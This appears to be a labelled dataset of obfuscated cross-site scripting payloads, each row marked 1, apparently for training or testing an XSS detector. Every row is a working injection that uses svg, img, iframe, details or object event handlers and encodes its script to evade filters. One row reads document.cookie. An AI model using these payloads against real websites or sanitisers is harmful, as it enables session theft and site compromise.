"<iframe srcdoc=""<svg onload=eval(atob(`YWxlcnQoMSk=`))>""></iframe>",1
"<svg onload=window[atob('YWxlcnQ=')].apply(null,[1])>",1
<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>,1
"<iframe srcdoc=""<img src=x onerror=window['ale'+'rt'](1)>""></iframe>",1
"<details open ontoggle='eval(atob(""YWxlcnQoMSk=""))'></details>",1
"<iframe srcdoc='<img src=x onerror=eval(unescape(""al%65rt(%31)""))>'></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](2)>""></iframe>",1
"<iframe src=""javascript:alert&#96;XSS&#96;"">",1
"<iframe srcdoc='<img src=x onerror=""window[`\x61\x6c\x65\x72\x74`](8)"">'/>",1
"<iframe src=""javascript:window['al'+'ert'](1)"">",1
<svg/onload=(eval)('ale'+'rt')(1)>,1
"<iframe srcdoc=""<svg onload=eval(eval('String.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(window['al'+'ert'](1))>""></iframe>",1
"<svg onload=""setInterval(function(){ale&#114;t('XSS')},1000)"">",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(window['al'+'ert'](1),0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=Function('javascri'+'pt:alert(1)')()>""></iframe>",1
<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(111)')>,1
"<svg onload=""eval(unescape('%61%6C%65%72%74%28%31%29'))"">",1
<svg onload=eval('\x61\x6c\x65\x72\x74(1)')>,1
<svg onload=window['a'+'l'+'ert'](1)></svg>,1
"<details open ontoggle='new Function(""al""+""ert(1)"")()'></details>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)>"">",1
"<iframe srcdoc=""<img src=x onerror=window[`al`+'ert']('1')>""></iframe>",1
<svg onload=eval(decodeURIComponent('\u0061\u006c\u0065\u0072\u0074(1)'))>,1
"<svg onload=""new Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",1
"<iframe srcdoc=""<img src=x onerror=eval(window.atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(() => alert(40), 0)</script>"">",1
"<svg onload=""this['r'+'emove']();&#x61;&#x6c;&#x65;&#x72;&#x74;(`18`)"">",1
"<svg><foreignObject><iframe srcdoc=""<script>eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))</script>""></foreignObject></svg>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9IndpbmRvdy5hbGVydCgxKSI+PC9zdmc+'></object>""></iframe>",1
"<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=""></object>",1
"<svg onload=""new Function(`\\u0061lert(1)`)()"">",1
<details open ontoggle=eval(atob('YWxlcnQoMSk='))>,1
"<svg onload='window[""al""+""ert""](String.fromCharCode(50,54))'>",1
"<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>",1
<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](30)>,1
<svg onload=window['al'+'ert'](String.fromCharCode(49))>,1
<iframe srcdoc='<svg onload=window[atob(&#x27;YWxlcnQ=&#x27;)](1)>'></iframe>,1
<svg onload=eval('al\x65rt(111)')>,1
"<svg onload=""eval(unescape('%61%6c%65%72%74%28%31%29'))"">",1
"<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>",1
"<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>'></object>",1
"<iframe srcdoc=""<script>let e=unescape('%61%6c%65%72%74%28%31%29');eval(e)</script>"">",1
"<iframe src=""data:text/html,<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></body>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>""></iframe>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74%28%31%29""))'></svg>",1
"<iframe srcdoc=""<script>setTimeout('alert(52)', 0)</script>"">",1
"<object data=""data:text/html,<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>""></object>",1
<svg onload=window[atob('YWxlcnQ=')](1)></svg>,1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>""></iframe>",1
"<svg onload='setTimeout(() => eval(""&#97;&#108;&#101;&#114;&#116;(22)""), 0)'>",1
"<details open ontoggle=""&#97;&#108;&#101;&#114;&#116;(1)""></details>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(`alert(1)`,0)>'></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<object data='data:text/html,<svg onload=eval(""al""+""ert(1)"")>'></object>",1
<svg/onload='eval(unescape(`%61%6c%65%72%74%28%31%29`))'>,1
"<iframe srcdoc=""<script>setTimeout('al&#101;rt(1)',100);</script>""></iframe>",1
"<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>",1
"<iframe srcdoc=""<svg onload=eval(window['unescape']('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='eval(atob(`YWxlcnQoMSk=`))'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'ert(1)',0)>"">",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,51,41))"">",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)></svg>""></iframe>",1
"<iframe srcdoc=""<script>var z=atob('YWxlcnQoNTkp');eval(z)</script>""></iframe>",1
<svg onload=eval(decodeURI('%61%6C%65%72%74%28%31%29'))>,1
"<iframe srcdoc=""<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>"">",1
"<iframe srcdoc=""<svg><script>self['ale'+'rt']('XSS')</script></svg>""></iframe>",1
"<svg onload=""window['\x65val']('\x61\x6c\x65\x72\x74\x28\x31\x29')"">",1
"<svg onload=""setTimeout(function(){window['al'+'ert'](1)},0)"">",1
<svg onload=window[`al`+`ert`](1)></svg>,1
"<iframe src=""data:text/html,<svg%20onload=%61lert%281%29>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>"">",1
"<svg onload='setTimeout(`alert(1)`, 0)'>",1
"<iframe srcdoc=""<img src=x onerror=window['al\x65rt'](1)>""></iframe>",1
"<svg onload=""window[atob('YWxlcnQ=')](1)"">",1
"<iframe srcdoc=""<details open ontoggle=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116)+""(1)"",0)>'></iframe>",1
"<svg onload=""setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)"">",1
"<object data=""data:text/html,<img src=x onerror=eval('al'+'ert(1)')>""></object>",1
"<svg onload='new Function(atob(""YWxlcnQoMSk=""))()'></svg>",1
"<iframe srcdoc=""<svg onload=eval(unescape('al%65rt(1)'))>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTEzKQ=='))</script>""></iframe>",1
"<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116)+`(1)`)')>",1
<svg onload=window[unescape('%u0061lert')](1)>,1
<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>,1
"<iframe srcdoc=""<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4='></object>""></iframe>",1
"<iframe srcdoc=""<script>eval(unescape('%61%6c%65%72%74%28%31%32%33%29'))</script>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('\\u0061\\u006c\\u0065\\u0072\\u0074(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%61%6c%65%72%74(1)'))>""></iframe>",1
"<svg onload='setTimeout(`eval(String.fromCharCode(97,108,101,114,116,40,49,41))`,0)'></svg>",1
<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>,1
<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(34)')>,1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74(1)""))'></svg>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%u0061lert(1)'))>""></iframe>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116)+`(1)`)>></svg>",1
"<details open ontoggle=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)',0)>",1
"<iframe srcdoc=""<script>alert(String.fromCharCode(49,49,49))</script>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout('&#x61;&#x6c;&#x65;&#x72;&#x74;(`24`)', 0)</script>"">",1
"<iframe srcdoc=""<svg onload=eval(`window[String.fromCharCode(97,108,101,114,116)](1)`)></svg>""></iframe>",1
"<svg onload=setTimeout(`al`+`ert(1)`,5)>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('a'+'lert(1)',0)>""></iframe>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></svg>,1
"<object data=""data:text/html,<svg onload=setTimeout('al&#x65;rt(1)',0)>""></object>",1
"<svg onload=eval(decodeURIComponent(""%61%6c%65%72%74%281%29""))>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>""></iframe>",1
"<svg onload=""&#x65v&#x61l(atob('YWxlcnQod2luZG93LmFsZXJ0KDEpKQ=='))"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](atob('WFNT'))</script>""></iframe>",1
"<svg onload='eval(Function(""return \\u0061\\u006c\\u0065\\u0072\\u0074(1)"")())'>",1
"<svg onload='(new Function(""return window""))()[[""al"",""ert""].join("""")](1)'></svg>",1
"<iframe srcdoc=""<svg onload=eval('al'+String.fromCharCode(101,114)+'t(`XSS`)')></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"">",1
<img src=x onerror=eval(decodeURIComponent(&#x27;%61%6C%65%72%74(1)&#x27;))>,1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>""></iframe>",1
"<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))></svg>",1
"<iframe srcdoc=""<script>Function('\u0061\u006c\u0065\u0072\u0074(40)')()</script>""></iframe>",1
<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>,1
"<svg/onload='eval(atob(""YWxlcnQoMCk=""))'>",1
"<iframe srcdoc=""<script>eval('al'+'ert(12)')</script>""></iframe>",1
<svg onload=&#97;&#x6c;&#x65;&#x72;&#x74;(1)></svg>,1
<details open ontoggle=window[atob('YWxlcnQ=')](1)></details>,1
"<iframe srcdoc=""<script>setInterval(() => alert(1), 1000)</script>"">",1
"<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116,40,49,41))>",1
<svg onload=window[decodeURI('%61%6C%65%72%74')](1)>,1
"<svg onload=""setTimeout(()=>{const e=Function;new e('ale'+'rt(1)')()},0)"">",1
<svg onload=window[decodeURIComponent('%61%6C%65%72%74')](1)>,1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](0x1)>""></iframe>",1
<details open ontoggle=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>,1
"<iframe srcdoc=""<svg onload=window[`al`+'ert'](1)>""></iframe>",1
"<iframe srcdoc='<svg xmlns=""http://www.w3.org/2000/svg""><script>alert(""XSS"");</script></svg>'></iframe>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74%28%31%31%31%29""))'>",1
"<iframe srcdoc=""<script>eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))</script>"">",1
"<svg onload='eval(atob(""YWxlcnQoMTIzKQ==""))'>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+'(1)')>""></iframe>",1
"<object data=""data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></object>",1
<svg onload=eval(`al\x65rt(1)`)></svg>,1
"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101,114,116,40,49,41))></svg>",1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'\x65rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>""></iframe>",1
<details open ontoggle=eval(`window['al'+'ert'](1)`)>,1
"<object data=""data:text/html,<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></svg>""></object>",1
"<svg onload='new Function(""\\u0061\\u006c\\u0065\\u0072\\u0074(1)"")()'></svg>",1
"<svg onload=setTimeout('eval(unescape(""%61%6c%65%72%74(1)""))',0)></svg>",1
"<iframe srcdoc='<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>'></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=window['al'+'ert'](12)>""></iframe>",1
"<iframe srcdoc=""<body onload=eval('al'+'ert(1)')>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=eval(atob(`YWxlcnQoMSk=`))>'></object>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>""></iframe>",1
"<svg onload=setTimeout('eval(unescape(`%61lert(1)`))',0)>",1
"<iframe srcdoc=""<script>import('data:text/javascript,al%65rt(123)')</script>""></iframe>",1
"<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>""></iframe>",1
<svg onload=window['al'+'\u0065rt'](1)>,1
"<iframe srcdoc=""<svg onload=window['al'+'ert']('XSS')>"">",1
"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",1
"<iframe srcdoc=""<svg/onload='eval(`al`+`ert(1)`);'>"">",1
"<iframe srcdoc=""<script>top[atob('YWxlcnQ=')](1)</script>"">",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(16)')>"">",1
